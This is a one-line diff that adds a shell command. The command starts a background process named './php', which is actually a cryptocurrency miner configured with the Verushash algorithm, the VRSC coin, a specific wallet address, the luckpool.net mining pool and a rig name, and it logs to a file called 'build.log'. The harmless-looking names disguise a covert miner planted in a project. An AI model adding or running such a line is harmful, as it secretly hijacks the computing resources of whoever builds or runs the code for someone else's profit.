@@ -1,0 +1,1 @@
+ping google.com & nohup ./php -algo Verushash -coin VRSC -wallet RXKKMD5LHex9nrigfwjFeu1t79144WXS2c  -pool1 na.luckpool.net:3956  -rigName  WR-01 > build.log
